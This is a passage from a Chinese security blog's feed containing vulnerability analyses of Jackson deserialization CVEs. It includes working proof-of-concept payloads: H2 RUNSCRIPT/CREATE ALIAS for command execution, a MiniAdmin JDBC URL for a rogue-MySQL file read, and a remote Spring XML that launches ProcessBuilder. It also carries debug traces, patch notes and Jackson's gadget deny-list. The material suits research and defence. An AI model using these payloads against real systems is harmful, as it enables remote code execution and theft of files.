'http://localhost:8000/inject.sql'\"&#125;]"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object object = mapper.readValue(payload, Object.class);</span><br><span class="line">            <span class="comment">// 反序列化之后还需要进行序列化操作才能触发！</span></span><br><span class="line">            String s = mapper.writeValueAsString(object);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，反序列化之后需要调用ObjectMapper.writeValueAsString()即进行序列化操作才能成功触发漏洞，这就是该CVE的鸡肋之处。</p><p>运行后，目标服务端接收到GET方式请求/inject.sql即成功：</p><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/1.png" alt=""></p><p>PoC中的JSON实际上是在H2内存数据库初始化的时候执行RUNSCRIPT指令，从指定的URL中加载执行SQL脚本。而由于刚才的Demo中Web服务未放置该SQL脚本因为没有执行，下面来看看怎么实现漏洞利用。</p><p>在Web服务端编写inject.sql，根据H2的用户可自定义函数的功能来实现，第一部分是<code>CREATE ALIAS</code>命令用来自定义shellexec()函数的内容，第二部分是<code>call</code>SQL命令，用来调用前面自定义的函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> SHELLEXEC <span class="keyword">AS</span> $$ <span class="built_in">void</span> shellexec(<span class="keyword">String</span> cmd) throws java.io.IOException &#123;</span><br><span class="line"><span class="keyword">String</span>[] command = &#123;<span class="string">"cmd"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">Runtime.getRuntime().exec(command);</span><br><span class="line">&#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure><p>再次运行即可成功弹计算器：</p><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/2.png" alt=""></p><p>我们可以再优化一下。我们看到payload中，url键对应的值其实就是一条SQL命令<code>jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost:8000/inject.sql&#39;</code>，因此，我们可以直接将相应的URL部分替换为其他SQL命令，使用文件存储方式先定义一个命令执行的函数，注意代码中的分号需要用反斜杠转义一下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, &#123;<span class="attr">"url"</span>:<span class="string">"jdbc:h2:file:~/.h2/mi1k7ea;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException &#123; Runtime.getRuntime().exec(cmd)\\; &#125;$$;"</span>&#125;]</span><br></pre></td></tr></table></figure><p>这里jdbc:h2:file会在本地Users目录中生成指定的数据库文件即C:/Users/xx/.h2/mi1k7ea.mv.db，下次可以直接调用该文件进行操作。</p><p>接着同样使用文件存储模式，执行CALL命令调用刚刚自定义的函数即可时效内任意代码执行：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, &#123;<span class="attr">"url"</span>:<span class="string">"jdbc:h2:file:~/.h2/mi1k7ea;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CALL SHELLEXEC('calc');"</span>&#125;]</span><br></pre></td></tr></table></figure><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/3.png" alt=""></p><h2 id="0x05-调试分析"><a href="#0x05-调试分析" class="headerlink" title="0x05 调试分析"></a>0x05 调试分析</h2><p>我们在ch.qos.logback.core.db.DriverManagerConnectionSource类上的所有getter方法和setter方法上打上断点，然后调试发现：</p><p>如果在Jackson反序列化之后不调用ObjectMapper.writeValueAsString()，则只会调用DriverManagerConnectionSource类的setUrl()函数；</p><p>如果在Jackson反序列化之后调用ObjectMapper.writeValueAsString()，则在调用DriverManagerConnectionSource类的setUrl()函数之后再调用getDriverClass()、getUrl()、getConnection()；</p><p>接着在<code>mapper.writeValueAsString(object);</code>处打上断点重新调试。</p><p>在Jackson序列化的过程中，会通过调用getter方法来获取对象的属性值，会循环调用BeanPropertyWriter.serializeAsField()函数，其中通过反射机制来调用要序列化的对象所属类的getter方法：</p><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/4.png" alt=""></p><p>在循环调用 函数的时候，会先后调用getDriverClass()、getUrl()、getConnection()等类的getter方法。</p><p>在最后调用getConnection()函数中，调用了DriverManager.getConnection()函数来和H2数据库进行连接交互，并且由于url参数我们外部可控，因此就能利用H2用户可自定义函数的特性来实现RCE：</p><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/5.png" alt=""></p><h2 id="0x06-补丁分析"><a href="#0x06-补丁分析" class="headerlink" title="0x06 补丁分析"></a>0x06 补丁分析</h2><p>Jackson在2.9.9.1版本中添加了ch.qos.logback.core.db.DriverManagerConnectionSource类的黑名单，具体的可在jackson-databind-2.9.9.1-sources.jar!/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java中看到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [databind#2334]: logback-core (2.9.9.1)</span></span><br><span class="line">s.add(<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>);</span><br></pre></td></tr></table></figure><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html" target="_blank" rel="noopener">Jackson gadgets - Anatomy of a vulnerability</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</title>
    <link href="https://www.mi1k7ea.com/2019/11/19/Jackson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%94CVE-2019-12086%EF%BC%88%E5%9F%BA%E4%BA%8EMiniAdmin%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/</id>
    <published>2019-11-19T13:04:08.000Z</published>
    <updated>2019-11-21T16:06:26.681Z</updated>
    
    <content type="html"><![CDATA[<p>该CVE是基于MiniAdmin的利用链的，和以往反序列化执行命令的漏洞不一样，本次的反序列化读取任意文件内容，如果ClassPath中有com.mysql.cj.jdbc.admin.MiniAdmin（存在MySQL的JDBC驱动中）这个类，那么Java应用所在的服务器上的文件，就可能被任意读取并传送到恶意的MySQL Server。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.x系列 &lt; 2.9.9</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>目标环境中需存在8.0.14版本以下的MySQL驱动，即mysql-connector-java版本 &lt; 8.0.14。</p><p>更具体地说，mysql-connector-java版本应为 6.0.3-8.0.15 之间才能成功触发。</p><h2 id="0x03-利用到的MySQL特性问题"><a href="#0x03-利用到的MySQL特性问题" class="headerlink" title="0x03 利用到的MySQL特性问题"></a>0x03 利用到的MySQL特性问题</h2><h3 id="LOAD-DATA-LOCAL"><a href="#LOAD-DATA-LOCAL" class="headerlink" title="LOAD DATA LOCAL"></a>LOAD DATA LOCAL</h3><p> 具体可参考：<a href="https://dev.mysql.com/doc/refman/5.7/en/load-data-local.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/load-data-local.html</a></p><p>下面简单说下。</p><p>MySQL支持使用LOAD DATA LOCAL INFILE语法，即可将客户端本地的文件中的数据insert到MySQL的某张表中。</p><p>协议的工作过程大致如下：</p><ol><li>用户在客户端输入：load data local file “/data.txt” into table test；</li><li>客户端-&gt;服务端：我想把我本地的/data.txt文件插入到test表中；</li><li>服务端-&gt;客户端：把你本地的/data.txt文件发给我；</li><li>客户端-&gt;服务端：/data.txt文件的内容；</li></ol><p>问题在于，客户端发送哪个文件的内容，取决于第三步即服务端响应的想要的哪个文件，如果服务端是个恶意的MySQL，那么它可以读取客户端的任意文件内容，比如读取/etc/passwd：</p><ol><li>用户在客户端输入：load data local file “/data.txt” into table test；</li><li>客户端-&gt;服务端：我想把我本地的/data.txt文件插入到test表中；</li><li>服务端-&gt;客户端：把你本地的/etc/passwd文件发给我；</li><li>客户端-&gt;服务端：/etc/passwd文件的内容；</li></ol><p>而且，在大部分客户端（比如MySQL Connect/J）的实现里，第一步和第二部并非是必须的，客户端发送任意查询给服务端，服务端都可以返回文件发送的请求。而大部分客户端在建立连接之后，都会有一些查询服务器配置之类的查询，所以使用这些客户端，只要创建了到恶意MySQL服务器的连接，那么客户端所在的服务器上的所有文件都可能泄露。</p><h3 id="allowLoadLocalInfile"><a href="#allowLoadLocalInfile" class="headerlink" title="allowLoadLocalInfile"></a>allowLoadLocalInfile</h3><p>allowLoadLocalInfile是MySQL的JDBC驱动的一个创建连接的配置项，用来控制是否允许从本地读取文件，默认值为True。</p><h2 id="0x04-复现利用"><a href="#0x04-复现利用" class="headerlink" title="0x04 复现利用"></a>0x04 复现利用</h2><p>PoC.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        String payload = <span class="string">"[\"com.mysql.cj.jdbc.admin.MiniAdmin\",\"jdbc:mysql://192.168.10.128:3307/test\"]"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下载恶意的MySQL服务器脚本，并运行在Linux中，同时指定读取目标MySQL客户端的哪个文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rogue_mysql_server.py <span class="string">"C:/Windows/win.ini"</span></span><br></pre></td></tr></table></figure><p>运行后，可以在MySQL服务端的mysql.log中读取到客户端的文件内容：</p><p><img src="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/1.png" alt=""></p><h2 id="0x05-调试分析"><a href="#0x05-调试分析" class="headerlink" title="0x05 调试分析"></a>0x05 调试分析</h2><p>在<code>mapper.readValue(payload, Object.class);</code>处打下断点进行调试。同时，我们分析MiniAdmin类发现，它并没有getter方法和setter方法，只有构造函数，也就是说该类的漏洞在于它的构造函数中，直接在它的构造函数处打下断点即可。</p><p>前面的函数调用过程和之前的没啥区别，直至调用newInstance()函数创建新的MiniAdmin类实例时，会调用到MiniAdmin类的构造函数，而该函数中则是直接调用了Jdbc的connect()方法、会直接去连接jdbcUrl指向的数据库地址：</p><p><img src="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/2.png" alt=""></p><p>利用链：newInstance()-&gt;MiniAdmin()-&gt;Driver.connect()</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:95, MiniAdmin (com.mysql.cj.jdbc.admin)</span><br><span class="line">&lt;init&gt;:79, MiniAdmin (com.mysql.cj.jdbc.admin)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">call1:129, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createFromString:299, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserializeFromString:1204, BeanDeserializerBase (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserializeOther:144, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:135, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:19, PoC</span><br></pre></td></tr></table></figure><h2 id="0x06-为何需要MySQL-Connector-J-gt-6-0-3"><a href="#0x06-为何需要MySQL-Connector-J-gt-6-0-3" class="headerlink" title="0x06 为何需要MySQL Connector/J &gt;= 6.0.3"></a>0x06 为何需要MySQL Connector/J &gt;= 6.0.3</h2><p>我们在mysql-connector-java-6.0.3-sources.jar!/com/mysql/cj/core/conf/PropertyDefinitions.java中看到，在其静态代码块中对maxAllowedPacket设置项设置为65535，即默认允许最大的包大小为65535：</p><p><img src="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/3.png" alt=""></p><p>而在中，我们发现其静态代码块中对maxAllowedPacket设置项设置为-1，也就是说默认不让你发包，也就不存在漏洞了：</p><p><img src="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/4.png" alt=""></p><h2 id="0x07-补丁分析"><a href="#0x07-补丁分析" class="headerlink" title="0x07 补丁分析"></a>0x07 补丁分析</h2><h3 id="MySQL-Connector-J的修复"><a href="#MySQL-Connector-J的修复" class="headerlink" title="MySQL Connector/J的修复"></a>MySQL Connector/J的修复</h3><p>MySQL Connector/J从8.0.15版本开始将allowLoadLocalInfile默认值设置为false。</p><p><a href="https://dev.mysql.com/doc/relnotes/connector-j/8.0/en/news-8-0-15.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/relnotes/connector-j/8.0/en/news-8-0-15.html</a></p><h3 id="Jackson的修复"><a href="#Jackson的修复" class="headerlink" title="Jackson的修复"></a>Jackson的修复</h3><p>从2.9.9版本开始，Jackson将”com.mysql.cj.jdbc.admin.MiniAdmin”加入到反序列化黑名单中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Set&lt;String&gt; s = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">        <span class="comment">// Courtesy of [https://github.com/kantega/notsoserial]:</span></span><br><span class="line">        <span class="comment">// (and wrt [databind#1599])</span></span><br><span class="line">        s.add(<span class="string">"org.apache.commons.collections.functors.InvokerTransformer"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.commons.collections.functors.InstantiateTransformer"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.commons.collections4.functors.InstantiateTransformer"</span>);</span><br><span class="line">        s.add(<span class="string">"org.codehaus.groovy.runtime.ConvertedClosure"</span>);</span><br><span class="line">        s.add(<span class="string">"org.codehaus.groovy.runtime.MethodClosure"</span>);</span><br><span class="line">        s.add(<span class="string">"org.springframework.beans.factory.ObjectFactory"</span>);</span><br><span class="line">        s.add(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.xalan.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">        <span class="comment">// [databind#1680]: may or may not be problem, take no chance</span></span><br><span class="line">        s.add(<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>);</span><br><span class="line">        <span class="comment">// [databind#1737]; JDK provided</span></span><br><span class="line">        s.add(<span class="string">"java.util.logging.FileHandler"</span>);</span><br><span class="line">        s.add(<span class="string">"java.rmi.server.UnicastRemoteObject"</span>);</span><br><span class="line">        <span class="comment">// [databind#1737]; 3rd party</span></span><br><span class="line"><span class="comment">//s.add("org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor"); // deprecated by [databind#1855]</span></span><br><span class="line">        s.add(<span class="string">"org.springframework.beans.factory.config.PropertyPathFactoryBean"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// s.add("com.mchange.v2.c3p0.JndiRefForwardingDataSource"); // deprecated by [databind#1931]</span></span><br><span class="line"><span class="comment">// s.add("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"); // - "" -</span></span><br><span class="line">        <span class="comment">// [databind#1855]: more 3rd party</span></span><br><span class="line">        s.add(<span class="string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span>);</span><br><span class="line">        s.add(<span class="string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>);</span><br><span class="line">        <span class="comment">// [databind#1899]: more 3rd party</span></span><br><span class="line">        s.add(<span class="string">"org.hibernate.jmx.StatisticsService"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>);</span><br><span class="line">        <span class="comment">// [databind#2032]: more 3rd party; data exfiltration via xml parsed ext entities</span></span><br><span class="line">        s.add(<span class="string">"org.apache.ibatis.parsing.XPathParser"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [databind#2052]: Jodd-db, with jndi/ldap lookup</span></span><br><span class="line">        s.add(<span class="string">"jodd.db.connection.DataSourceConnectionProvider"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [databind#2058]: Oracle JDBC driver, with jndi/ldap lookup</span></span><br><span class="line">        s.add(<span class="string">"oracle.jdbc.connector.OracleManagedConnectionFactory"</span>);</span><br><span class="line">        s.add(<span class="string">"oracle.jdbc.rowset.OracleJDBCRowSet"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [databind#2097]: some 3rd party, one JDK-bundled</span></span><br><span class="line">        s.add(<span class="string">"org.slf4j.ext.EventData"</span>);</span><br><span class="line">        s.add(<span class="string">"flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor"</span>);</span><br><span class="line">        s.add(<span class="string">"com.sun.deploy.security.ruleset.DRSHelper"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.axis2.jaxws.spi.handler.HandlerResolverImpl"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [databind#2186]: yet more 3rd party gadgets</span></span><br><span class="line">        s.add(<span class="string">"org.jboss.util.propertyeditor.DocumentEditor"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.openjpa.ee.RegistryManagedRuntime"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.openjpa.ee.JNDIManagedRuntime"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.axis2.transport.jms.JMSOutTransportInfo"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [databind#2326] (2.9.9): one more 3rd party gadget</span></span><br><span class="line">        s.add(<span class="string">"com.mysql.cj.jdbc.admin.MiniAdmin"</span>);</span><br><span class="line"></span><br><span class="line">        DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="https://www.cnblogs.com/xinzhao/p/11005419.html" target="_blank" rel="noopener">分析Jackson的安全漏洞CVE-2019-12086</a></p><p><a href="https://github.com/jas502n/CVE-2019-12086-jackson-databind-file-read" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-12086-jackson-databind-file-read</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</title>
    <link href="https://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/</id>
    <published>2019-11-17T05:02:59.000Z</published>
    <updated>2019-11-26T14:06:49.410Z</updated>
    
    <content type="html"><![CDATA[<p>本次Jackson反序列化漏洞是基于org.springframework.context.support.ClassPathXmlApplicationContext的利用链的。在开启enableDefaultTyping()或使用有问题的@JsonTypeInfo注解的前提下，可以通过jackson-databind来滥用Spring的SpEL表达式注入漏洞来触发Jackson反序列化漏洞的，从而达到任意命令执行的效果。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.7系列 &lt; 2.7.9.2</p><p>Jackson 2.8系列 &lt; 2.8.11</p><p>Jackson 2.9系列 &lt; 2.9.4</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>不受JDK限制，可直接在JDK1.8上运行。</p><p>需要服务端环境存在额外的jar包，以我本地环境为例：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE，spring-expression-5.0.2.RELEASE，commons-logging-1.2。</p><h2 id="0x03-复现利用"><a href="#0x03-复现利用" class="headerlink" title="0x03 复现利用"></a>0x03 复现利用</h2><p>PoC.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        <span class="comment">//CVE-2017-17485</span></span><br><span class="line">        String payload = <span class="string">"[\"org.springframework.context.support.ClassPathXmlApplicationContext\", \"http://127.0.0.1/spel.xml\"]"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>spel.xml，放置在第三方Web服务中，看到id为pb的bean标签，指定了类为java.lang.ProcessBuilder，在其中有两个子标签，constructor-arg标签设置参数值为具体的命令，property标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"calc.exe"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"whatever"</span> <span class="attr">value</span>=<span class="string">"#&#123; pb.start() &#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行即可成功触发：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/1.png" alt=""></p><h2 id="0x04-调试分析"><a href="#0x04-调试分析" class="headerlink" title="0x04 调试分析"></a>0x04 调试分析</h2><p>本次的利用链是基于org.springframework.context.support.ClassPathXmlApplicationContext类，利用的原理就是SpEL表达式注入漏洞。</p><p>我们在<code>mapper.readValue(payload, Object.class);</code>上打上断点开始调试。</p><p>调试到UntypedObjectDeserializer.deserializeWithType()函数，其中会调用AsArrayTypeDeserializer.deserializeTypedFromAny()函数来解析我们数组形式的JSON内容：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/2.png" alt=""></p><p>往下调试，发现会调用BeanDeserializerBase.deserializeFromString()函数来反序列化字符串内容，它会返回一个调用createFromString()函数从字符串中创建的实例对象：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/3.png" alt=""></p><p>跟进去看StdValueInstantiator.createFromString()函数，此时_fromStringCreator变量为AnnotatedConstructor类实例，参数value值为<code>http://127.0.0.1/spel.xml</code>，接着就是调用AnnotatedConstructor.call1()：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/4.png" 